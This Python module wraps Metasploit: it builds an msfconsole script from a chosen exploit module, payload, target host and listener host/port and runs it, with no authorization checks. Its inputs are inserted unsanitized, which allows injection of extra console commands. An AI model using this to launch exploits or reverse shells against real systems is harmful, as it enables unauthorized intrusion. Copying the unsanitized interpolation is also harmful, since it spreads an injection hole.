# backend/services/exploit_automation.py

import subprocess

def run_exploit(module, payload, rhost, lhost, lport="4444"):
    script = f"""
use {module}
set PAYLOAD {payload}
set RHOSTS {rhost}
set LHOST {lhost}
set LPORT {lport}
exploit -z
exit
"""
    try:
        result = subprocess.run(["msfconsole", "-q", "-x", script], capture_output=True, text=True)
        return {"output": result.stdout[-2000:]}  # Tail output
    except Exception as e:
        return {"error": str(e)}
